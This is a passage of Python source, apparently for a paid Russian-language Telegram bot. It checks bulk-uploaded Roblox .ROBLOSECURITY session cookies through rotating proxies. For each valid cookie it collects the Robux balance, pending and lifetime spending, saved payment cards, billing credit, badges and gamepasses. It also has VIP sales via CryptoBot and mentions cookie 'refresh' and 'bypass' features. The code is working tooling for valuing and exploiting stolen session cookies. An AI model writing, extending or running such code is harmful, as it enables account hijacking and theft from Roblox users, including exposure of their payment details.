        DefeatedPatientZero    = 'Defeated Patient Zero!',    2433001319089453, 'Defeated_Patient_Zero'
        TriumphHardcore        = 'Triumph Hardcore',          2124629158,       'Triumph_Hardcore'
        Quickdraw              = 'Quickdraw!',                2128794398,       'Quickdraw'
        TheLostSouls           = 'The Lost Souls',            2129234540,       'The_Lost_Souls'
        FrostInvasionEasy      = 'Frost Invasion - Easy',     1566890568849948, 'Frost_Invasion_Easy'
        FrostInvasionHard      = 'Frost Invasion - Hard',     842976148689508,  'Frost_Invasion_Hard'
        NightI                 = 'Night I',                   103759295562992,  'Night_I'
        NightIEasy             = 'Night I Easy',              1029294163081388, 'Night_I_Easy'
        NightII                = 'Night II',                  3061903590409955, 'Night_II'
        NightIIEasy            = 'Night II Easy',             1785439979300169, 'Night_II_Easy'
        NightIII               = 'Night III',                 1632959225008577, 'Night_III'
        NightIIIEasy           = 'Night III Easy',            1522290797999169, 'Night_III_Easy'
        Unnamed                = '???',                       1270412135564244, 'Unnamed'
        # List Of Badges
        listOfBadges = [WelcometoTDS, Level10, Level20, Level30, Level50, Level75, Level100, Level150, DefeatedtheBrute, DefeatGraveDigger, DefeatMoltenWarlord, DefeattheFallenKing, DefeatedNuclearMonster, DefeatedGunslinger, DefeatedWoxTheFox, DefeatedPatientZero, TriumphHardcore, Quickdraw, TheLostSouls, FrostInvasionEasy, FrostInvasionHard, NightI, NightIEasy, NightII, NightIIEasy, NightIII, NightIIIEasy, Unnamed]

class YourBizarreAdventure: # https://www.roblox.com/games/2809202155
    placeNames = 'Your Bizarre Adventure', 'Your_Bizarre_Adventure', 'YBA', 2809202155
    class Gamepasses:
        ItemNotifier      = 'Item Notifier',          7355317,  'Item_Notifier'
        SelectPose        = 'Select Pose',            7361207,  'Select_Pose'
        CosmeticsBundle1  = 'Cosmetics Bundle #1',    7368580,  'Cosmetics_Bundle_1'
        VoiceLines        = 'Voice Lines',            7376923,  'Voice_Lines'
        Tips              = 'Tips',                   8062778,  'Tips'
        StandStorageSlot1 = 'Stand Storage: Slot #1', 9837261,  'Stand_Storage_Slot_1'
        StandStorageSlot2 = 'Stand Storage: Slot #2', 9838197,  'Stand_Storage_Slot_2'
        StandStorageSlot3 = 'Stand Storage: Slot #3', 9838201,  'Stand_Storage_Slot_3'
        StandStorageSlot4 = 'Stand Storage: Slot #4', 16423469, 'Stand_Storage_Slot_4'
        StandStorageSlot5 = 'Stand Storage: Slot #5', 16423475, 'Stand_Storage_Slot_5'
        StyleStorageSlot2 = 'Style Storage: Slot #2', 13258801, 'Style_Storage_Slot_2'
        StyleStorageSlot3 = 'Style Storage: Slot #3', 13258808, 'Style_Storage_Slot_3'
        x2CosmeticSlots   = '2x Cosmetic Slots',      14597766, '2x_Cosmetic_Slots'
        x2Inventory       = '2x Inventory',           14597778, '2x_Inventory'
        # List Of Gamepasses
        listOfGamepasses = [ItemNotifier, SelectPose, CosmeticsBundle1, VoiceLines, Tips, StandStorageSlot1, StandStorageSlot2, StandStorageSlot3, StandStorageSlot4, StandStorageSlot5, StyleStorageSlot2, StyleStorageSlot3, x2CosmeticSlots, x2Inventory]
    class Badges:
        Prestige1 = 'Prestige 1', 2124517293, 'Prestige_1'
        Prestige2 = 'Prestige 2', 2124517294, 'Prestige_2'
        Prestige3 = 'Prestige 3', 2124517296, 'Prestige_3'
        # List Of Badges
        listOfBadges = [Prestige1, Prestige2, Prestige3]

listOfPlaces = [NinetyNineNightsintheForest, AUniversalTime, AdoptMe, AnimeAdventures, AnimeDefenders, AnimeVanguards, BedWars, BeeSwarmSimulator, BladeBall, BloxFruits, BlueLockRivals, BubbleGumSimulatorINFINITY, CreaturesofSonaria, DaHood, DragonAdventures, Fisch, FiveNightsTD, GrandPieceOnline, GrowaGarden, Jailbreak, JujutsuInfinite, KingLegacy, MurderMystery2, PetSimulator99, PETSGO, ProjectSlayers, Rivals, RoyalHigh, SolsRNG, StealaBrainrot, ToiletTowerDefense, TowerDefenseSimulator, YourBizarreAdventure]


# Использую PriorityQueue для приоритета VIP
check_queue = queue.PriorityQueue()
current_checking = None
queue_status = {}
sent_queue_notifications = {}
active_tasks = set()
queue_task = None
validator_queue = queue.Queue()
current_validator_checking = None
validator_queue_status = {}
validator_sent_notifications = {}
validator_active_tasks = set()
validator_task = None
os.makedirs(DATABASE_DIR, exist_ok=True)
os.makedirs(COOKIE_FILES_DIR, exist_ok=True)

class Database:
    @staticmethod
    def register_user(user_id: int, username: str = None) -> tuple:
        user_path = f'{DATABASE_DIR}{user_id}'
        is_new = False
        if not os.path.exists(user_path):
            os.makedirs(f'{user_path}/logs', exist_ok=True)
            is_new = True
            
            config = {
                'cookie_check_count': 0,
                'registration_date': str(date.today()),
                'badges': None,
                'gamepasses': None,
                'username': username,
                'last_activity': str(datetime.now()),
                'total_checks': 0,
                'valid_cookies_found': 0,
                'invalid_cookies_found': 0,
                'check_params': DEFAULT_CHECK_PARAMS.copy(),
                'output_format': DEFAULT_OUTPUT_FORMAT.copy(),
                'game_settings': DEFAULT_GAME_SETTINGS.copy(),
                'playtime_settings': DEFAULT_PLAYTIME_SETTINGS.copy(),
                'is_vip': False,
                'vip_until': None,
                'referral_code': None,
                'referred_by': None,
                'referral_count': 0,
                'bonus_checks': 0
            }
            with open(f'{user_path}/config.json', 'w') as f:
                json.dump(config, f, indent=4)
        
        return user_path, is_new

    @staticmethod
    def get_user_config(user_id: int):
        user_path, _ = Database.register_user(user_id)
        with open(f'{user_path}/config.json', 'r') as f:
            return json.load(f)

    @staticmethod
    def update_config(user_id: int, key: str, value):
        user_path, _ = Database.register_user(user_id)
        config = Database.get_user_config(user_id)
        config[key] = value
        config['last_activity'] = str(datetime.now())
        with open(f'{user_path}/config.json', 'w') as f:
            json.dump(config, f, indent=4)

    @staticmethod
    def update_check_param(user_id: int, param_name: str, value: bool):
        config = Database.get_user_config(user_id)
        if 'check_params' not in config:
            config['check_params'] = DEFAULT_CHECK_PARAMS.copy()
        config['check_params'][param_name] = value
        Database.update_config(user_id, 'check_params', config['check_params'])

    @staticmethod
    def update_output_format(user_id: int, format_name: str, value: bool):
        config = Database.get_user_config(user_id)
        if 'output_format' not in config:
            config['output_format'] = DEFAULT_OUTPUT_FORMAT.copy()
        
        if format_name == 'zip' and value == True:
            config['output_format']['zip'] = True
            config['output_format']['txt'] = False
        elif format_name == 'txt' and value == True:
            config['output_format']['txt'] = True
            config['output_format']['zip'] = False
        else:
            config['output_format'][format_name] = value
        
        Database.update_config(user_id, 'output_format', config['output_format'])

    @staticmethod
    def update_game_setting(user_id: int, game_name: str, enabled: bool):
        config = Database.get_user_config(user_id)
        if 'game_settings' not in config:
            config['game_settings'] = DEFAULT_GAME_SETTINGS.copy()
        if game_name in config['game_settings']:
            config['game_settings'][game_name]['enabled'] = enabled
        Database.update_config(user_id, 'game_settings', config['game_settings'])

    @staticmethod
    def update_playtime_setting(user_id: int, game_name: str, enabled: bool):
        config = Database.get_user_config(user_id)
        if 'playtime_settings' not in config:
            config['playtime_settings'] = DEFAULT_PLAYTIME_SETTINGS.copy()
        config['playtime_settings'][game_name] = enabled
        Database.update_config(user_id, 'playtime_settings', config['playtime_settings'])

    @staticmethod
    async def send_startup_message():
        try:
            users = Database.get_all_users()
            for user_id in users:
                try:
                    await bot.send_message(user_id, 
                        "🌟 <b>Бот включен!</b>",
                        parse_mode=ParseMode.HTML)
                except Exception as e:
                    logging.error(f"Не удалось отправить сообщение пользователю {user_id}: {e}")

            for admin_id in ADMINS:
                try:
                    await bot.send_message(
                        admin_id,
                        f"✅ <b>Бот успешно запущен</b>\n\n"
                        f"🕐 Время запуска: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
                        f"👥 Всего пользователей: {len(users)}\n\n"
                        f"🎯 Готов к работе!",
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    logging.error(f"Ошибка отправки статуса админу {admin_id}: {e}")
                    
        except Exception as e:
            logging.error(f"Ошибка в startup уведомлениях: {e}")

    @staticmethod
    def save_proxies(proxies: list):
        with open(PROXIES_FILE, 'w') as f:
            f.write('\n'.join(proxies))

    @staticmethod
    def load_proxies() -> list:
        if os.path.exists(PROXIES_FILE):
            with open(PROXIES_FILE, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    @staticmethod
    def get_all_users() -> list:
        users = []
        for user_id in os.listdir(DATABASE_DIR):
            if user_id.isdigit():
                users.append(int(user_id))
        return users

    @staticmethod
    def ban_user(user_id: int, reason: str):
        banned_users = Database.load_banned_users()
        banned_users[str(user_id)] = {
            'reason': reason,
            'date': str(date.today()),
            'admin': ADMINS[0]
        }
        with open(f'{DATABASE_DIR}banned_users.json', 'w') as f:
            json.dump(banned_users, f, indent=4)

    @staticmethod
    def unban_user(user_id: int):
        banned_users = Database.load_banned_users()
        if str(user_id) in banned_users:
            del banned_users[str(user_id)]
            with open(f'{DATABASE_DIR}banned_users.json', 'w') as f:
                json.dump(banned_users, f, indent=4)

    @staticmethod
    def load_banned_users() -> dict:
        if os.path.exists(f'{DATABASE_DIR}banned_users.json'):
            with open(f'{DATABASE_DIR}banned_users.json', 'r') as f:
                try:
                    return json.load(f)
                except json.JSONDecodeError:
                    return {}
        return {}

    @staticmethod
    def is_user_banned(user_id: int) -> bool:
        banned_users = Database.load_banned_users()
        return str(user_id) in banned_users

    @staticmethod
    def get_ban_reason(user_id: int) -> str:
        banned_users = Database.load_banned_users()
        ban_info = banned_users.get(str(user_id), {})
        return ban_info.get('reason', 'Причина не указана')
    
    @staticmethod
    def increment_daily_checks(user_id: int):
        """Увеличивает счётчик ежедневных проверок"""
        config = Database.get_user_config(user_id)
        today = str(date.today())
        
        # Инициализируем если нет
        if 'daily_checks' not in config:
            config['daily_checks'] = {}
        
        # Если дата изменилась - сбрасываем счётчик
        if config.get('last_check_date') != today:
            config['daily_checks'] = {today: 1}
            config['last_check_date'] = today
        else:
            # Увеличиваем счётчик за текущий день
            config['daily_checks'][today] = config['daily_checks'].get(today, 0) + 1
        
        Database.update_config(user_id, 'daily_checks', config['daily_checks'])
        Database.update_config(user_id, 'last_check_date', config['last_check_date'])
    
    @staticmethod
    def get_daily_check_count(user_id: int) -> int:
        """Получает количество проверок пользователя за сегодня"""
        config = Database.get_user_config(user_id)
        today = str(date.today())
        
        if 'daily_checks' not in config:
            return 0
        
        # Если дата изменилась - счётчик нулевой
        if config.get('last_check_date') != today:
            return 0
        
        return config['daily_checks'].get(today, 0)
    
    @staticmethod
    def can_use_free_check(user_id: int) -> bool:
        """Проверяет может ли пользователь использовать бесплатную проверку"""
        count = Database.get_daily_check_count(user_id)
        return count < 5
    
    @staticmethod
    def get_checks_remaining(user_id: int) -> int:
        """Получает количество оставшихся бесплатных проверок"""
        count = Database.get_daily_check_count(user_id)
        remaining = max(0, 5 - count)
        return remaining
    
    @staticmethod
    def set_vip_status(user_id: int, is_vip: bool, days: int = None):
        """Устанавливает VIP статус пользователю"""
        config = Database.get_user_config(user_id)
        config['is_vip'] = is_vip
        
        if is_vip and days:
            vip_until = (datetime.now() + timedelta(days=days)).isoformat()
            config['vip_until'] = vip_until
        elif not is_vip:
            config['vip_until'] = None
        
        Database.update_config(user_id, 'is_vip', config['is_vip'])
        Database.update_config(user_id, 'vip_until', config['vip_until'])
    
    @staticmethod
    def is_vip(user_id: int) -> bool:
        """Проверяет VIP статус пользователя"""
        config = Database.get_user_config(user_id)
        
        if not config.get('is_vip', False):
            return False
        
        # Если VIP имеет срок действия
        vip_until = config.get('vip_until')
        if vip_until:
            vip_until_dt = datetime.fromisoformat(vip_until)
            if datetime.now() > vip_until_dt:
                Database.set_vip_status(user_id, False)
                return False
        
        return True
    
    @staticmethod
    def get_vip_priority(user_id: int) -> int:
        """Получает приоритет для очереди (0 для VIP, 1 для обычных)"""
        return 0 if Database.is_vip(user_id) else 1
    
    @staticmethod
    def generate_referral_code(user_id: int) -> str:
        """Генерирует уникальный реферальный код"""
        import hashlib
        import secrets
        # Используем комбинацию user_id и случайной строки для уникальности
        code = hashlib.sha256(f"{user_id}-{secrets.token_hex(8)}".encode()).hexdigest()[:8].upper()
        return code
    
    @staticmethod
    def get_or_create_referral_code(user_id: int) -> str:
        """Получает существующий или создаёт новый реф код"""
        config = Database.get_user_config(user_id)
        
        if config.get('referral_code'):
            return config['referral_code']
        
        # Создаём новый код
        code = Database.generate_referral_code(user_id)
        Database.update_config(user_id, 'referral_code', code)
        return code
    
    @staticmethod
    def register_referral(referrer_id: int, new_user_id: int):
        """Регистрирует нового пользователя по рефеферальной ссылке"""
        # Обновляем профиль рефереров
        referrer_config = Database.get_user_config(referrer_id)
        referrer_config['referral_count'] = referrer_config.get('referral_count', 0) + 1
        # Даём 3 бонусных проверки за каждого приглашенного
        referrer_config['bonus_checks'] = referrer_config.get('bonus_checks', 0) + 3
        Database.update_config(referrer_id, 'referral_count', referrer_config['referral_count'])
        Database.update_config(referrer_id, 'bonus_checks', referrer_config['bonus_checks'])
        
        # Обновляем профиль нового пользователя
        new_user_config = Database.get_user_config(new_user_id)
        new_user_config['referred_by'] = referrer_id
        # Даём 1 бонусную проверку за регистрацию по реферальной ссылке
        new_user_config['bonus_checks'] = new_user_config.get('bonus_checks', 0) + 1
        Database.update_config(new_user_id, 'referred_by', referrer_id)
        Database.update_config(new_user_id, 'bonus_checks', new_user_config['bonus_checks'])
    
    @staticmethod
    def get_user_by_referral_code(code: str) -> int:
        """Получает ID пользователя по реф коду"""
        all_users = Database.get_all_users()
        for user_id in all_users:
            config = Database.get_user_config(user_id)
            if config.get('referral_code') == code:
                return user_id
        return None
    
    @staticmethod
    def can_use_bonus_check(user_id: int) -> bool:
        """Проверяет есть ли бонусные проверки"""
        config = Database.get_user_config(user_id)
        bonus = config.get('bonus_checks', 0)
        return bonus > 0
    
    @staticmethod
    def use_bonus_check(user_id: int) -> bool:
        """Использует одну бонусную проверку"""
        config = Database.get_user_config(user_id)
        bonus = config.get('bonus_checks', 0)
        
        if bonus <= 0:
            return False
        
        config['bonus_checks'] = bonus - 1
        Database.update_config(user_id, 'bonus_checks', config['bonus_checks'])
        return True
    
    @staticmethod
    def add_pending_payment(user_id: int, invoice_id: str, payment_method: str, amount: float, days: int):
        """Добавляет ожидающий платёж в отслеживание"""
        payments_file = f'{DATABASE_DIR}pending_payments.json'
        
        payments = {}
        if os.path.exists(payments_file):
            with open(payments_file, 'r') as f:
                payments = json.load(f)
        
        payments[invoice_id] = {
            'user_id': user_id,
            'payment_method': payment_method,
            'amount': amount,
            'days': days,
            'created_at': str(datetime.now()),
            'status': 'pending'
        }
        
        with open(payments_file, 'w') as f:
            json.dump(payments, f, indent=4)
    
    @staticmethod
    def get_pending_payment(invoice_id: str) -> dict:
        """Получает информацию об ожидающем платёже"""
        payments_file = f'{DATABASE_DIR}pending_payments.json'
        
        if not os.path.exists(payments_file):
            return None
        
        with open(payments_file, 'r') as f:
            payments = json.load(f)
        
        return payments.get(invoice_id)
    
    @staticmethod
    def confirm_payment(invoice_id: str) -> bool:
        """Подтверждает платёж и выдаёт VIP"""
        payments_file = f'{DATABASE_DIR}pending_payments.json'
        
        if not os.path.exists(payments_file):
            return False
        
        with open(payments_file, 'r') as f:
            payments = json.load(f)
        
        payment = payments.get(invoice_id)
        if not payment:
            return False
        
        user_id = payment['user_id']
        days = payment['days']
        
        # Выдаём VIP статус
        Database.set_vip_status(user_id, True, days)
        
        # Помечаем платёж как завершённый
        payment['status'] = 'completed'
        payment['completed_at'] = str(datetime.now())
        payments[invoice_id] = payment
        
        with open(payments_file, 'w') as f:
            json.dump(payments, f, indent=4)
        
        return True

def create_crypto_invoice(user_id, amount=2):
    """Создание инвойса в CryptoBot"""
    try:
        response = requests.post(
            'https://pay.crypt.bot/api/createInvoice',
            headers={
                'Crypto-Pay-API-Token': CRYPTOBOT_API_KEY,
                'Content-Type': 'application/json'
            },
            json={
                'asset': 'USDT',
                'amount': str(amount),
                'description': f'VIP подписка на 30 дней для пользователя {user_id}',
                'hidden_message': f'UserID: {user_id}',
                'paid_btn_name': 'viewItem',
                'paid_btn_url': f'https://t.me/verybadrobot',
                'payload': json.dumps({'user_id': user_id, 'type': 'vip_30days'})
            }
        )

        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                return data['result']['pay_url'], data['result']['invoice_id']

        return None, None
    except Exception as e:
        logging.error(f"Ошибка при создании CryptoBot инвойса: {e}")
        return None, None

def check_crypto_invoice_paid(invoice_id):
    """Проверка оплаты инвойса в CryptoBot"""
    try:
        response = requests.get(
            f'https://pay.crypt.bot/api/getInvoices?invoice_ids={invoice_id}',
            headers={'Crypto-Pay-API-Token': CRYPTOBOT_API_KEY}
        )

        if response.status_code == 200:
            data = response.json()
            if data.get('ok') and data['result']['items']:
                return data['result']['items'][0]['status'] == 'paid'

        return False
    except Exception as e:
        logging.error(f"Ошибка при проверке CryptoBot инвойса: {e}")
        return False

class Form(StatesGroup):
    gamepass = State()
    badge = State()
    file = State()
    support_message = State()
    admin_reply = State()
    validator_file = State()
    refresh_file = State()
    bypass_file = State()
    check_cookie = State()
    refresh_cookie = State()
    bypass_cookie = State()
    validate_cookie = State()
    select_game = State()
    select_badges_for_game = State()
    select_gamepasses_for_game = State()
    check_cookies_for_games = State()
    cookie_splitter = State()
    cookie_sorter = State()

bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
router = Router()

semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)

async def send_startup_message():
    users = Database.get_all_users()
    for user_id in users:
        try:
            await bot.send_message(user_id, 
                "🌟 <b>Бот включен!</b>\n\n",
                parse_mode=ParseMode.HTML)
        except Exception as e:
            logging.error(f"Не удалось отправить сообщение пользователю {user_id}: {e}")

async def log_to_admin(action: str, user_id: int, username: str = None):
    message = (
        f"👤 Пользователь: @{username if username else 'none'} (ID: {user_id})\n"
        f"🕐 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"📝 Действие: {action}"
    )
    for admin_id in ADMINS:
        try:
            await bot.send_message(admin_id, message)
        except Exception as e:
            logging.error(f"Не удалось отправить сообщение админу {admin_id}: {e}")

async def get_all_time_donate(session: aiohttp.ClientSession, cookie: str, user_id: int, proxy: str = None):
    total_donate = 0
    cursor = ""
    proxy_url = f"http://{proxy}" if proxy else None
    while True:
        try:
                url = f'https://economy.roblox.com/v2/users/{user_id}/transactions'
                params = {
                    "limit": 100,
                    "transactionType": "Purchase",
                    "itemPricingType": "All",
                    "cursor": cursor
                }

                async with session.get(
                    url,
                    params=params,
                    cookies={".ROBLOSECURITY": cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 429:
                        await asyncio.sleep(5)
                        continue

                    data = await response.json()
                    transactions = data.get('data', [])

                    for transaction in transactions:
                        total_donate += transaction.get('currency', {}).get('amount', 0)

                    cursor = data.get('nextPageCursor')
                    if not cursor:
                        break
        except: pass
    if total_donate != 0:
        total_donate = str(total_donate).strip('-')
    return int(total_donate)

async def get_pending_and_donate(cookie: str, user_id: int, proxy: str = None):
    url = f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                url,
                cookies={".ROBLOSECURITY": cookie.strip()},
                allow_redirects=False,
                proxy=f"http://{proxy}" if proxy else None,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status == 200 and response.content_type == 'application/json':
                    data = await response.json()
                    donate = data.get('purchasesTotal', 0)
                    if donate != 0:
                        donate = str(donate).strip('-')
                    pending = data.get('pendingRobuxTotal', 0)
                    return {
                        "donate": int(donate),
                        "pending": pending
                    }
                else:
                    return {"donate": 0, "pending": 0}
    except Exception as e:
        logging.error(f"Error fetching pending and donate: {e}")
        return {"donate": 0, "pending": 0}

async def check_billing(session: aiohttp.ClientSession, cookie: str, proxy: str = None):
    billing_url = 'https://billing.roblox.com/v1/credit'
    try:
        async with session.get(
            billing_url, 
            cookies={".ROBLOSECURITY": cookie},
            proxy=f"http://{proxy}" if proxy else None,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            if response.status == 200:
                data = await response.json()
                balance = data.get('balance', 0)
                currency_code = data.get('currencyCode', 'USD')
                return f"{balance/100:.2f} {currency_code}"
            else:
                return "error"
    except Exception as e:
        logging.error(f"Billing check error: {e}")
        return "error"

async def check_game_cookie_with_retry(session: aiohttp.ClientSession, cookie: str, game_name: str, badge_ids: list, gamepass_ids: list, proxies: list):
    """Проверка куки для игры с повторными попытками как в обычном check_cookie"""
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_game_cookie(session, cookie, game_name, badge_ids, gamepass_ids, proxy, None)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.debug(f"Game check attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    # Если все попытки с прокси не удались, пробуем без прокси один раз
    try:
        result = await check_game_cookie(session, cookie, game_name, badge_ids, gamepass_ids, None, None)
        return result
    except Exception as e:
        logging.error(f"Game check failed after {MAX_RETRIES} retries: {last_error or str(e)}")
        return {
            'status': 'error',
            'game_name': game_name,
            'username': 'Unknown',
            'badges_found': [],
            'gamepasses_found': [],
            'cookie': cookie
        }

async def check_game_cookie(session: aiohttp.ClientSession, cookie: str, game_name: str, badge_ids: list, gamepass_ids: list, proxy: str = None, user_id: int = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        
        # Сначала проверяем что кука валидна
        try:
            async with session.get(
                'https://users.roblox.com/v1/users/authenticated',
                cookies={'.ROBLOSECURITY': cookie},
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
                proxy=proxy_url
            ) as response:
                if response.status == 401:
                    return {'status': 'invalid', 'game_name': game_name, 'username': 'Unknown', 'badges_found': [], 'gamepasses_found': [], 'cookie': cookie}
                if response.status != 200:
                    return {'status': 'invalid', 'game_name': game_name, 'username': 'Unknown', 'badges_found': [], 'gamepasses_found': [], 'cookie': cookie}
                
                user_data = await response.json()
                user_id_num = user_data['id']
        except Exception as auth_error:
            logging.debug(f"Auth check failed: {auth_error}")
            return {'status': 'invalid', 'game_name': game_name, 'username': 'Unknown', 'badges_found': [], 'gamepasses_found': [], 'cookie': cookie}
        
        # Получаем имя пользователя
        try:
            async with session.get(
                'https://www.roblox.com/my/settings/json',
                cookies={'.ROBLOSECURITY': cookie},
                proxy=proxy_url,
                timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            ) as response:
                if response.status != 200:
                    return {'status': 'invalid', 'game_name': game_name, 'username': 'Unknown', 'badges_found': [], 'gamepasses_found': [], 'cookie': cookie}
                settings = await response.json()
        except Exception as settings_error:
            logging.debug(f"Settings fetch failed: {settings_error}")
            return {'status': 'invalid', 'game_name': game_name, 'username': 'Unknown', 'badges_found': [], 'gamepasses_found': [], 'cookie': cookie}
        
        result = {
            'status': 'valid',
            'username': settings.get('Name', 'Unknown'),
            'game_name': game_name,
            'badges_found': [],
            'gamepasses_found': [],
            'cookie': cookie
        }
        
        # Проверяем бейджи через inventory API (как в обычной проверке)
        if badge_ids:
            for badge_id in badge_ids:
                try:
                    async with session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id_num}/items/2/{badge_id}/is-owned',
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        response_text = await response.text()
                        if response_text.lower() == 'true':
                            result['badges_found'].append(badge_id)
                except Exception as e:
                    logging.debug(f"Badge check error for {badge_id}: {e}")
                    continue
        
        # Проверяем геймпассы через inventory API (как в обычной проверке)
        if gamepass_ids:
            for gp_id in gamepass_ids:
                try:
                    async with session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id_num}/items/1/{gp_id}/is-owned',
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        response_text = await response.text()
                        if response_text.lower() == 'true':
                            result['gamepasses_found'].append(gp_id)
                except Exception as e:
                    logging.debug(f"Gamepass check error for {gp_id}: {e}")
                    continue
        
        return result
        
    except Exception as e:
        logging.error(f"Game cookie check error: {e}")
        return {'status': 'error', 'game_name': game_name}

async def check_cookie_with_retry(session: aiohttp.ClientSession, cookie: str, badges: list, gamepasses: list, proxies: list, user_id: int = None):
    retries = 0
    last_error = None
    used_proxies = set()
    
    while retries < MAX_RETRIES:
        proxy = None
        if proxies:
            available_proxies = [p for p in proxies if p not in used_proxies]
            if available_proxies:
                proxy = random.choice(available_proxies)
                used_proxies.add(proxy)
            else:
                used_proxies.clear()
                continue
        
        try:
            async with semaphore:
                result = await check_cookie(session, cookie, badges, gamepasses, proxy, user_id)
                if result['status'] == 'valid':
                    return result
                else:
                    last_error = result.get('message', 'Invalid cookie')
        except Exception as e:
            last_error = str(e)
            logging.warning(f"Attempt {retries+1} failed (proxy: {proxy}): {e}")
        
        retries += 1
        if retries < MAX_RETRIES:
            await asyncio.sleep(1)
    
    logging.error(f"All attempts failed: {last_error}")
    return {'status': 'invalid', 'message': last_error}

async def check_cookie(session: aiohttp.ClientSession, cookie: str, badges: list, gamepasses: list, proxy: str = None, user_id: int = None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        REQUEST_DELAY = 1
        
        if user_id:
            config = Database.get_user_config(user_id)
            check_params = config.get('check_params', DEFAULT_CHECK_PARAMS.copy())
        else:
            check_params = DEFAULT_CHECK_PARAMS.copy()
        
        async with session.get(
            'https://users.roblox.com/v1/users/authenticated',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            proxy=proxy_url
        ) as response:
            if response.status == 401:
                return {'status': 'invalid'}
            if response.status != 200:
                return {'status': 'invalid'}
            
            user_data = await response.json()
            user_id = user_data['id']
            
        async with session.get(
            f'https://users.roblox.com/v1/users/{user_id}',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            if response.status == 200:
                user_info = await response.json()
                created_str = user_info.get('created')
                creation_date = 'Unknown'
                if created_str:
                    try:
                        dt = datetime.fromisoformat(created_str.replace('Z', '+00:00'))
                        creation_date = dt.strftime('%d.%m.%Y')
                    except:
                        pass
            else:
                creation_date = 'Unknown'
        
        async with session.get(
            'https://www.roblox.com/my/settings/json',
            cookies={'.ROBLOSECURITY': cookie},
            proxy=proxy_url,
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        ) as response:
            settings = await response.json()
            
        
        result = {
            'status': 'valid',
            'username': settings.get('Name', 'Unknown'),
            'balance': 0,
            'pending': 0,
            'donate': 0,
            'all_time_donate': 0,
            'premium': False,
            'card': False,
            'cards_count': 0,
            'email': False,
            'creation_date': creation_date,
            'badges': '',
            'gamepasses': '',
            'rap': 0,
            'rare_items': {},
            'billing': 'error',
            'cookie': cookie,
            'proxy_used': proxy,
            'country': 'Unknown',
            'playtime': {},
            'game_donations': {},
            'group_balance': 0,
            'place_visits': 0
        }
        
        
        if check_params.get('balance', True):
            try:
                async with session.get(
                    'https://economy.roblox.com/v1/user/currency',
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    if response.status == 200:
                        balance_data = await response.json()
                        result['balance'] = balance_data.get('robux', 0)
            except:
                pass
        
        
        if check_params.get('pending', True) or check_params.get('donate_year', True):
            pending_donate_data = await get_pending_and_donate(cookie, user_id, proxy)
            if check_params.get('pending', True):
                result['pending'] = pending_donate_data["pending"]
            if check_params.get('donate_year', True):
                result['donate'] = pending_donate_data["donate"]
        
        
        if check_params.get('donate_all_time', True):
            result['all_time_donate'] = await get_all_time_donate(session, cookie, user_id, proxy)
        
        
        if check_params.get('premium', True):
            result['premium'] = settings.get('IsPremium', False)
        
        
        if check_params.get('cards', True):
            try:
                card_url = 'https://apis.roblox.com/payments-gateway/v1/payment-profiles'
                async with session.get(
                    card_url,
                    cookies={'.ROBLOSECURITY': cookie},
                    proxy=proxy_url,
                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                ) as response:
                    cards = await response.json()
                    result['card'] = "Last4Digits" in str(cards)
                    if result['card']:
                        result['cards_count'] = 1
            except:
                pass
        
        
        if check_params.get('email', True):
            result['email'] = settings.get('UserEmailVerified', False)
        
        
        if badges and check_params.get('badges', True):
            badges_result = []
            for badge in badges:
                try:
                    async with session.get(
                        f'https://inventory.roblox.com/v1/users/{user_id}/items/2/{badge}/is-owned',
                        cookies={'.ROBLOSECURITY': cookie},
                        proxy=proxy_url,
                        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                    ) as response:
                        response_text = await response.text()
                        if response_text.lower() == 'true':
                            if check_params.get('badges_by_name', True):
                                async with session.get(
                                    f"https://badges.roblox.com/v1/badges/{badge}",
                                    cookies={'.ROBLOSECURITY': cookie},
                                    proxy=proxy_url,
                                    timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
                                ) as name_response:
